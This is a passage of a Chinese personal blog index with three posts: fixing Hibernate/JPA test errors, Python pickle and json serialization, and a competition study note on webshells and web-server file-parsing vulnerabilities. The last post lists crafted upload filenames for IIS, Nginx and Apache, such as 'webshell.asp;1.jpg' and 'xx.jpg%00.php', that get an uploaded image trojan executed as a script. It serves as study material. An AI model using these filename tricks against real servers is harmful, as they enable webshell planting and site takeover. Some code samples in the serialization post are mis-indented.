    &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;version&gt;4.12&lt;/version&gt;
&lt;/dependency&gt;

&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-test --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
    &lt;artifactId&gt;spring-test&lt;/artifactId&gt;
    &lt;version&gt;5.1.6.RELEASE&lt;/version&gt;
    &lt;scope&gt;provided&lt;/scope&gt;
&lt;/dependency&gt;

&lt;!-- ============== test end ============== --&gt;</code></pre><hr>
<p><strong>2.junit test运行时报错</strong></p>
<p>报错信息：</p>
<pre><code>Caused by: org.hibernate.MappingException: Could not get constructor for org.hibernate.persister.entity.SingleTableEntityPersister
at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:123) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:77) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.metamodel.internal.MetamodelImpl.initialize(MetamodelImpl.java:128) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.internal.SessionFactoryImpl.&lt;init&gt;(SessionFactoryImpl.java:300) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.boot.internal.SessionFactoryBuilderImpl.build(SessionFactoryBuilderImpl.java:460) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.jpa.boot.internal.EntityManagerFactoryBuilderImpl.build(EntityManagerFactoryBuilderImpl.java:892) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.springframework.orm.jpa.vendor.SpringHibernateJpaPersistenceProvider.createContainerEntityManagerFactory(SpringHibernateJpaPersistenceProvider.java:58) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.createNativeEntityManagerFactory(LocalContainerEntityManagerFactoryBean.java:365) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.buildNativeEntityManagerFactory(AbstractEntityManagerFactoryBean.java:391) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.afterPropertiesSet(AbstractEntityManagerFactoryBean.java:378) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.afterPropertiesSet(LocalContainerEntityManagerFactoryBean.java:341) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1855) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1792) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1108) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE]
...
...25 more
Caused by: org.hibernate.HibernateException: Unable to instantiate default tuplizer [org.hibernate.tuple.entity.PojoEntityTuplizer]
at org.hibernate.tuple.entity.EntityTuplizerFactory.constructTuplizer(EntityTuplizerFactory.java:91) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.tuple.entity.EntityTuplizerFactory.constructDefaultTuplizer(EntityTuplizerFactory.java:116) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.tuple.entity.EntityMetamodel.&lt;init&gt;(EntityMetamodel.java:382) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.persister.entity.AbstractEntityPersister.&lt;init&gt;(AbstractEntityPersister.java:519) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.persister.entity.SingleTableEntityPersister.&lt;init&gt;(SingleTableEntityPersister.java:124) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[?:?]
at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[?:?]
at jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[?:?]
at java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:500) ~[?:?]
at java.lang.reflect.Constructor.newInstance(Constructor.java:481) ~[?:?]
at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:96) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:77) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.metamodel.internal.MetamodelImpl.initialize(MetamodelImpl.java:128) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.internal.SessionFactoryImpl.&lt;init&gt;(SessionFactoryImpl.java:300) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.boot.internal.SessionFactoryBuilderImpl.build(SessionFactoryBuilderImpl.java:460) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.hibernate.jpa.boot.internal.EntityManagerFactoryBuilderImpl.build(EntityManagerFactoryBuilderImpl.java:892) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
at org.springframework.orm.jpa.vendor.SpringHibernateJpaPersistenceProvider.createContainerEntityManagerFactory(SpringHibernateJpaPersistenceProvider.java:58) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.createNativeEntityManagerFactory(LocalContainerEntityManagerFactoryBean.java:365) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.buildNativeEntityManagerFactory(AbstractEntityManagerFactoryBean.java:391) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
...
... 25 more
...</code></pre><p>最初还提示’org.springframework.beans.factory.BeanCreationException:’，我一开始以为是配置文件applicationContextTest-resources.xml的问题。一直在找是不是bean定义的问题。但是怎么改都这样。查了网上的资料才知道有可能不是配置文件的问题。’Caused by: org.hibernate.MappingException: Could not get constructor for org.hibernate.persister.entity.SingleTableEntityPersister’可能是有三种原因导致的。</p>
<p>1.实体类属性没有get,set方法，或者get，set方法的格式不严谨</p>
<p>右键source，选择’generate getter and setter’生成属性的get,set方法。但是检查了一下，发现我都是eclipse自动生成的get，set方法。格式是严格按照要求的，属性也都有get，set方法。但是每次运行测试类之前最好检查一下实体类属性的get,set方法</p>
<p>2.没有导入需要的jar文件</p>
<p>这里需要导入java-assist的jar文件，在pom中添加这个</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
    &lt;version&gt;3.23.1-GA&lt;/version&gt;
&lt;/dependency&gt;</code></pre><p>导入这个jar包后发现，不报错，说明需要导入这个jar包。</p>
<p>3.实体属性名和映射文件的property name不一致</p>
<p>这个的解决方法就是让实体属性名和映射文件property name一致就行了。</p>
<hr>
<p><strong>3.javax.net.ssl.SSLException</strong></p>
<p>在stackflow上看到了解决方法，在jdbc配置文件（我这里是jdbc.properties）给url添加一个参数useSSL=false,不再报错。</p>
<hr>
<p>参考链接：<a href="https://stackoverflow.com/questions/18042247/could-not-get-constructor-for-org-hibernate-persister-entity-singletableentitype" target="_blank" rel="noopener">https://stackoverflow.com/questions/18042247/could-not-get-constructor-for-org-hibernate-persister-entity-singletableentitype</a></p>
<p><a href="https://blog.51cto.com/zero01/2294152" target="_blank" rel="noopener">https://blog.51cto.com/zero01/2294152</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/13/JPA初学问题总结/" data-id="ckeqw4yfl0009j0v9kswt4hhf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python序列化及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/11/python序列化及反序列化/" class="article-date">
  <time datetime="2020-04-11T08:12:38.980Z" itemprop="datePublished">2020-04-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Python序列化及反序列化"><a href="#Python序列化及反序列化" class="headerlink" title="Python序列化及反序列化"></a>Python序列化及反序列化</h1><hr>
<p><strong>1.为什么要使用序列化？</strong></p>
<p>  由于TCP/IP协议不能够传输对象，我们需要将对象转换为字节数组来传输。所以对象序列化后结果就是字节数组。当通信双方进行通讯时，发送方通过序列化将对象转化为可传输的二进制字节序列。而接受方则通过反序列化将二进制字节序列转换为对象。</p>
<p><strong>2.什么是序列化及反序列化？</strong></p>
<p>  通俗地讲，序列化就是将内存中的变量转换成可存储的，可传输的二进制序列。而反序列化就是二进制序列重新转换成对象。在python中序列化可以理解为将对象转换成json字符串，而反序列化则是将json字符串转换成对象。序列化在python中被称作pickling，反之，反序列化就称做unpickling。python为我们提供了json和pickle库来执行序列化及反序列化的操作。</p>
<p><strong>3.pickle模块</strong></p>
<p>  pickle模块只限于通信双方都是python的情况。和json比较，pickle模块可以持久化用户自定义的对象，而json只限于python的基本类型。python的pickle模块提供了几个函数：</p>
<pre><code>dump 将对象序列化，存在文件中
dumps 将对象序列化 但不存入文件而是返回bytes数组
load 文件中读取的数据反序列化
loads bytes数组反序列化</code></pre><p>示例：</p>
<p>首先要导入pickle模块</p>
<pre><code>import pickle
list=&apos;a b c h j k&apos;.split(&apos; &apos;)
data=pickle.dumps(list)
print(&apos;序列化{}&apos;.format(data))
data2=pickle.loads(data)
print(&apos;反序列化{}&apos;.format(data2))</code></pre><p>输出：</p>
<pre><code>序列化b&apos;\x80\x03]q\x00(X\x01\x00\x00\x00aq\x01X\x01\x00\x00\x00bq\x02X\x01\x00\x00\x00cq\x03X\x01\x00\x00\x00hq\x04X\x01\x00\x00\x00jq\x05X\x01\x00\x00\x00kq\x06e.&apos;
反序列化[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]</code></pre><p>第一个示例是序列化为了bytes 我们也可以利用dump方法直接写入文件。得到file like object。不过pickle是以二进制的形式处理文件，所以读写文件要用’wb’和’rb’。</p>
<pre><code>import pickle
d=dict(name=&quot;张三&quot;,age=16,grade=&quot;五年级&quot;,score=&quot;90&quot;)
with open(&quot;json_pickle.txt&quot;,&apos;wb&apos;) as f:
    pickle.dump(d,f)
with open(&quot;json_pickle.txt&quot;,&apos;rb&apos;) as f:
    d2=pickle.load(f)
print(d2)</code></pre><p>对自定义对象进行序列化：</p>
<pre><code>import pickle
class car:



    def __init__(self,brand):
           self.brand=brand
       def show(self):
        print(&quot;the car belongs to&quot;+self.brand)
with open(&apos;json_pickle.txt&apos;,&apos;wb&apos;) as f:
s=car(&apos;法拉利&apos;)
s.show()
pickle.dump(s,f)
with open(&apos;json_pickle.txt&apos;,&apos;rb&apos;) as f:
    s2=pickle.load(f)
    s2.show()</code></pre><p>输出：</p>
<pre><code>the car belongs to法拉利
the car belongs to法拉利</code></pre><p><strong>4.json模块</strong></p>
<p>怎么在不同的编程语言之间传递对象？这里就用到了json（javascript object notation）JSON表示出来就是一个字符串(特殊格式），可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。</p>
<p>json的数据类型可以是双引号引起来的字符串，数值，true和false，null（None），对象（字典），数组（列表）。其中null相当python的none，ture，false相当python的True，False。</p>
<p>json常用函数：</p>
<pre><code>dumps json 编码 
dump json 编码并存入文件
loads json 解码
load json 解码，从文件读取数据</code></pre><p>示例</p>
<pre><code>import json
    list=&quot;a b c h j k&quot;.split(&apos; &apos;)
    print(list)
with open(&apos;json_pickle.txt&apos;,&apos;w&apos;) as f:
    json.dump(list,f)
with open(&apos;json_pickle.txt&apos;,&apos;r&apos;) as f:
    d2=json.load(f)
print(d2)</code></pre><p>输出：</p>
<pre><code>[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]
[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]</code></pre><p>json不能对自定义对象进行序列化和反序列化。</p>
<pre><code>import json
class Car:
    def __init__(self,brand):
        self.brand=brand
    def show(self):
        print(&quot;the car belongs to&quot;+self.brand)
car=Car(&apos;法拉利&apos;)
def car2dict(car):
return {
&apos;brand&apos;: car.brand,
}

# 对自定义类的对象进行序列化操作
print(json.dumps(car, default=car2dict))</code></pre><p>##python序列化及反序列化中的安全问题</p>
<hr>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/11/python序列化及反序列化/" data-id="ckeqw4yfs000dj0v9v89d0eh3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="new-tie-san-webshell" class="article article-type-new" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/15/tie-san-webshell/" class="article-date">
  <time datetime="2020-03-15T11:42:11.000Z" itemprop="datePublished">2020-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/15/tie-san-webshell/">tie-san-webshell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="铁三知识点复习-webshell"><a href="#铁三知识点复习-webshell" class="headerlink" title="铁三知识点复习 webshell"></a>铁三知识点复习 webshell</h1><hr>
<p><strong>什么是webshell？</strong></p>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。简单来说就是通过网站漏洞获得网站控制权限。(百度百科的解释)</p>
<p>在计算机科学中，shell指的是”为用户提供操作界面的软件”。类似于windows的cmd.exe和Linux下的bash。webshell是网站的后门，也是一个命令解释器。不过是以http协议这样的方式通信。继承了web权限。我们也可以把webshell理解为在服务器端可执行的文件，后缀名通常为.asp,.php,.aspx,.jsp。</p>
<hr>
<p><strong>解析漏洞</strong></p>
<p>解析漏洞就是web服务器没有严格处理http请求。导致不该执行的文件或脚本当作可执行的文件或脚本执行。大部分都是通过带有特别后缀的文件使得网页将其解析成可执行的文件或脚本，从而导致网站被恶意攻击。</p>
<p><strong>常见的解析漏洞</strong></p>
<p>1.IIS 5.x/6.0解析漏洞</p>
<p>在IIS5.X和IIS6.0版本中存在以下两个解析漏洞。第一种是如果上传的文件后缀是”*.asp;1.jpg”分号后面不会被解析 而会被服务器当成asp文件执行,从而绕过服务器能上传asp文件的限制.<br>IIS6.0版本中，默认可执行文件除了test.asp以外，还包括test.asa、test.cer、test.cdx这三种，同样也存在解析漏洞</p>
<pre><code>webshell.asp;1.jpg
webshell.asa;1.jpg
webshell.cer;1.jpg
webshell.cdx;1.jpg</code></pre><p>第二种叫做目录解析,在网站中建立名字为<em>.asp、</em>.asa的文件夹，其目录内的任何扩展名文件都会被IIS当做ASP文件来解析并执行。</p>
<pre><code>xxxxxx/xxxxx/.asp/xx.jpg(xx.jpg会被当作asp文件执行)</code></pre><p>2.IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</p>
<p>IIS 7.0/IIS 7.5/ Nginx &lt;8.03在Fast-CGI运行模式下，在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。</p>
<p>在某些使用有漏洞的网站中，访问<a href="http://127.0.0.1/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时就认为1.php是不存在的。" target="_blank" rel="noopener">http://127.0.0.1/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时就认为1.php是不存在的。</a></p>
<p>这就意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的webshell，在使用菜刀链接即可。</p>
<pre><code>1.jpg/1.php(1.jpg就是图片马,可以用Ultraedit等生成)</code></pre><p>3.Nginx &lt;8.03 空字节代码执行漏洞</p>
<p>影响范围：Nginx0.5.,0.6., 0.7-0.7.65, 0.8- 0.8.37<br>访问以下网址，服务器将把xx.jpg文件当做php解析并执行。<br>    <a href="http://www.xxx.com/xx.jpg%00.php" target="_blank" rel="noopener">http://www.xxx.com/xx.jpg%00.php</a></p>
<p>4.Apache解析漏洞</p>
<p>apache1或apache2版本</p>
<p>apache解析文件后缀是从右到左解析,如果遇到apache不能解析的文件后缀就会略过而解析下一个后缀.</p>
<pre><code>xxxx.php.rar(apache不能解析rar,会略过.但php可以被apache解析.文件会被解析成php文件)</code></pre><p>5.CVE-2013-4547 Nginx解析漏洞</p>
<p>访问以下网址，服务器将把xx.jpg文件当做php解析并执行。</p>
<pre><code>http://www.xxx.com/xx.jpg（非编码空格）\0.php</code></pre><hr>
<p><strong>中间件</strong></p>
<p>一个正常的web访问顺序：浏览器-&gt;服务器(WWW)-&gt;web容器-&gt;中间件(web应用服务器)-&gt;数据库服务器。而中间件主要包括Tomcat,jboss,weblogic等等。</p>
<pre><code>web服务器：IIS、Apache、Nginx、Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish、Lighttpd等
web中间件：Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish等
web容器：IIS(asp容器)、Tomcat(servlet容器)、Jboss(EJB容器)</code></pre><p><strong>什么是中间件？</strong><br>中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。</p>
<p><strong>iis简介</strong></p>
<p>iis（internet information service）是微软开发的针对WINDOWS 系统下运行的中间件。主要用来解析.ASP，.ASA，.CER三种文件格式的文件。 </p>
<p>不同windows版本对应的iis版本</p>
<pre><code>Windows 2003 server -------&gt;IIS 6.0
Windows 7 -------&gt;IIS 7.0和IIS 7.5
Windows 2008 server sp2 -------&gt; IIS 7.0
Windows 2008 server R2--------&gt;IIS 7.5
xp和2000 server对应的IIS 5.0</code></pre><p>安装iis（windows10）：控制面板-&gt;程序-&gt;启用或关闭windows功能-&gt;选择”internet information service”</p>
<p><img src="https://img-blog.csdnimg.cn/2020031519471530.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>iis默认的web目录是 \inetpub\wwwroot</p>
<p>iis日志分析：默认为W3C拓展日志文件格式，该内容可在站点属性中查看。iis日志可以分析web攻击。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315194814669.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<pre><code>date : 发出请求时候的日期。

time: 发出请求时候的时间。注意：默认情况下这个时间是格林威治时间，比我们的北京时间晚8个小时。

s-sitename：服务名，记录当记录事件运行于客户端上的Internet服务的名称和实例的编号。

s-ip：服务器的IP地址。

cs-method：请求中使用的HTTP方法，GET/POST。（POST方法可能无法记录请求的详细内容）

cs-uri-stem：URI资源，记录做为操作目标的统一资源标识符（URI），即访问的页面文件。

cs-uri-query：URI查询，记录客户尝试执行的查询，只有动态页面需要URI查询，如果有则记录，没有则以连接符-表示。即访问网址的附带参数。

s-port：为服务配置的服务器端口号。

cs-username：用户名，访问服务器的已经过验证用户的名称，匿名用户用连接符-表示。

c-ip：客户端IP地址。

cs(User-Agent)：用户代理，客户端浏览器、操作系统等情况。

sc-status：协议状态，记录HTTP状态代码，200表示成功，403表示没有权限，404表示找不到该页面。

sc-substatus：协议子状态，记录HTTP子状态代码

sc-win32-status：Win32状态，记录Windows状态代码。

sc-bytes：服务器发送的字节数。

cs-bytes：服务器接受的字节数。

time-taken：记录操作所花费的时间，单位是毫秒。</code></pre><p><strong>apache简介</strong></p>
<p>apache是一种开源的web服务器，支持HTTP协议。</p>
<p>LINUX下安装apache服务：<code>yum -y install httpd</code> 启动apache服务：<code>service httpd start</code></p>
<p>Apache日志分析：Apache日志主要分为以下类：error.log(错误日志)和access.log(访问日志),ssl_access_log(http访问日志),ssl_error_log(http错误日志),ssl_request_log(http请求日志) ，实际排查过程中更常用的是error_log，apache日志同样可以查看web攻击（sql注入，xss）。一般可以通过查看apache配置文件查看apache日志的位置。有关apache日志的详细内容可以访问：<a href="https://www.freebuf.com/column/144833.html" target="_blank" rel="noopener">https://www.freebuf.com/column/144833.html</a>,讲解的还是比较详细的。这里就不再做过多的介绍了。</p>
<p><strong>nginx简介</strong></p>
<p>Nginx是一个开源且高性能、可靠的HTTP中间件、代理服务。是一个异步框架的web服务器。也可以用作反向代理，负载平衡器 和 请求分发。其特点是相对于apache服务器占有内存少，并发能力强。</p>
<p>打开nginx\conf\nginx.conf可以对nginx进行配置。这里是几个比较重要的配置参数：</p>
<pre><code>user 设置nginx的系统使用用户

work_processes 设置进程数

error_log nginx的错误日志

pid nginx服务启动时的pid（进程编号） 

event: worker_connections 每个进程允许的最大连接数

    use 工作进程数</code></pre><p>nginx日志也有两种：access.log(记录网页的访问信息) errors.log(记录处理http请求的错误状态以及nginx本身服务的错误状态)。</p>
<p><strong>JBOSS简介</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/15/tie-san-webshell/" data-id="ckeqw4yfx000hj0v9z8gttdtp" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/09/06/new-post/">new post</a>
          </li>
        
          <li>
            <a href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/">springboot分页 pageable作参数以及List转换为Page</a>
          </li>
        
          <li>
            <a href="/2020/08/31/vue-element-admin用户登录流程/">vue-element-admin用户登录流程</a>
          </li>
        
          <li>
            <a href="/2020/05/13/git版本回退提交操作/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/04/26/BUUCTF-old-hack/">BUUCTF old hack</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>